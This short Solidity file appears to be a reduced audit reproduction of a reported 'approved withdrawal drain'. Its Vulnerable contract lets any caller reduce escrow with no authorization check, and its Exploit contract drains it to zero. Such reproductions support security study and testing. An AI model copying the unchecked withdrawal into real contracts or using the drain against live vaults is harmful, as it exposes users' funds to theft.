// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 61458: Blueberry approved withdrawal drain. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public escrow = 100; mapping(address => bool) public approved; function requestRedeem(uint256 amount) external { escrow -= amount; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.requestRedeem(100); success = bug.escrow() == 0;
    }
}


